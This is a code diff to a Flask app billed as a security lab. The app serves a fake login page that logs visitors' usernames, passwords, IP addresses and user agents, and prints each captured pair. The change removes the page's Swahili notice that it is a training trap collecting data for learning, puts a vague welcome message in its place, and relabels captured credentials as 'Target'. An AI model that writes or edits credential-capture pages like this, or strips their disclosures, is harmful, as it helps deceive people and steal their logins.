@@ -24,7 +24,7 @@ def save_attempt(username, password, ip, user_agent):
     logs.append(data)
     with open(LOG_FILE, "w") as f:
         json.dump(logs, f, indent=4)
-    print(f"[!] 🎯 Mtego: {username}:{password}")
+    print(f"[!] 🎯 Target: {username}:{password}")
 
 @app.route('/')
 def home():
@@ -41,8 +41,8 @@ def login():
     <html><head><title>NEXUS</title></head>
     <body style="background:#0a0a1a;color:#00ffcc;font-family:monospace;text-align:center;padding-top:50px;">
         <h1>🧸 NEXUS</h1>
-        <h2 style="color:#ff4444;">⚠️ HUU NI MTEGO WA MAFUNZO! ⚠️</h2>
-        <p>Taarifa zimehifadhiwa kwa madhumuni ya kujifunza.</p>
+        <h2 style="color:#ff4444;">⚠️ WELCOME TO OUR WORLD, GUEST, WAIT FOR OUR ANSWERS ⚠️</h2>
+        <p>KNOWLEDGE OVER CHAOS.</p>
         <a href="/" style="color:#00ffcc;">Rudi</a>
     </body></html>
     """
@@ -67,7 +67,7 @@ def dashboard():
 if __name__ == '__main__':
     print("\n╔════════════════════════════════════════╗")
     print("║    🧸 NEXUS SECURITY LAB v2.0         ║")
-    print("║    Built by Luiz Vad & Chief 🫩      ║")
+    print("║    Built by Luiz Vad                  ║")
     print("║    \"Jifunze. Elewa. Linda.\"           ║")
     print("╚════════════════════════════════════════╝\n")
     print("[✓] NEXUS: http://localhost:5000")
